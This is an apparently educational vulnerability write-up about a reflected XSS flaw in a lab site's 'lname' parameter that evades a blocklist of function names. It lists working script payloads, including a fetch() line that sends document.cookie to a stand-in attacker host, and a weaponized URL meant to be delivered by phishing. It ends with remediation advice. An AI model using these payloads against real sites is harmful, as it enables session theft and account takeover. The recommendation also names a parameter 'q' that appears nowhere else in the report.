## Title
Reflected XSS in `lname` param Bypasses Function Name Filter allowing Arbitrary JavaScript Execution

## OWASP - Vulnerability
OWASP Top 10 2025 - A05 Injection

## Description
An unauthenticated Reflected Cross-Site Scripting (XSS) vulnerability exists in the profile page's `lname` parameter. The server reflects user input into the HTTP response without context-aware output encoding. The filter blocks certain function names (`alert`, `confirm`) but allows others, so alternate JavaScript functions like `prompt` execute in a victim's browser.

## Vulnerable Endpoint
`https://profile.pwnedbox.site/?`

## Payload Used
```
  cybrnoob'"<><ScriPt>prompt(1)</ScriPt>
  cybrnoob'"<><ScriPt>console.error(document.location)</ScriPt>
  cybrnoob'"<><ScriPt>fetch('https://attacker.tld/steal?c='+document.cookie)</ScriPt>
```
## POC / Steps to Reproduce
1. Check for all parameters at the lab url `https://profile.pwnedbox.site/?` using `x8scan`
    <img width="583" height="207" alt="Screenshot 2026-11-23 at 2 30 53 PM" src="https://github.com/user-attachments/assets/8996181a-b65b-4001-9392-e8068ca994e3" />
    - Here we identified 2 parameters, `fname` and `lname`.
2. For the parameters found, check via automation to see if a reflected url path exists.
    <img width="509" height="447" alt="Screenshot 2026-11-23 at 2 31 10 PM" src="https://github.com/user-attachments/assets/13f4e4e0-010f-47a5-be9e-b0748ed2ebed" />
    - Here we find the the parameter `lname` is reflected.
3. Similarly, upon interacting with textboxes at `https://docs.pwnedbox.site/` it can be observed that the `js` payload is not reflected in the source code for `fname` but reflected for `lname`.
    <img width="756" height="491" alt="SCR-20261123-mxuo" src="https://github.com/user-attachments/assets/5430754f-4e38-411a-bda8-34a90a9a60a8" />
    <img width="756" height="491" alt="SCR-20261123-mxwv" src="https://github.com/user-attachments/assets/f50fb116-4f1b-4e74-b40d-8489800d092a" />
4. Inject the javascript in the URL to see if it is executed.
   - Here it can be seen that the `alert(), confirm()` functions are being filtered.
    <img width="756" height="491" alt="SCR-20261123-okvu" src="https://github.com/user-attachments/assets/edb99715-a07e-4795-9d0b-bb2499f5ecc9" />
    <img width="756" height="491" alt="SCR-20261123-olaw" src="https://github.com/user-attachments/assets/a87f77f9-1322-410d-ae52-d95c977106a0" />
5. Verify if other tags are filtered.
  - Note: `prompt(), console.log(), console.error(), fetch()` all generate valid responses.
     - Here it can be seen that the injected payload executes seamlessly.
      <img width="756" height="491" alt="SCR-20261123-ooqf" src="https://github.com/user-attachments/assets/dc95ec76-883e-428e-9fff-22c1920ef87b" />
      <img width="756" height="491" alt="SCR-20261123-oomv" src="https://github.com/user-attachments/assets/3ada0329-6993-4c49-8670-a5b4c8e5eadf" />
6. Craft a weaponized URL (e.g., `https://docs.pwnedbox.site/?fname=&lname=<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.

## Impact / Risk
1. An attacker can steal session cookies and impersonate the victim.
2. Malicious script can display fake login forms and steal credentials.
3. The script can redirect users, alter page content, or perform actions on their behalf.

## Recommendation
1. Never trust any user input. Treat parameter `q` as untrusted even if it is hidden.
2. Sanitize the input and remove HTML tags server-side instead of relying on a case-sensitive blocklist.
3. Apply context-aware HTML encoding on output so reflected input is rendered as text and never as executable markup.
4. Use a vetted encoding library, add a restrictive Content Security Policy, and set HttpOnly and SameSite on session cookies as defense in depth.
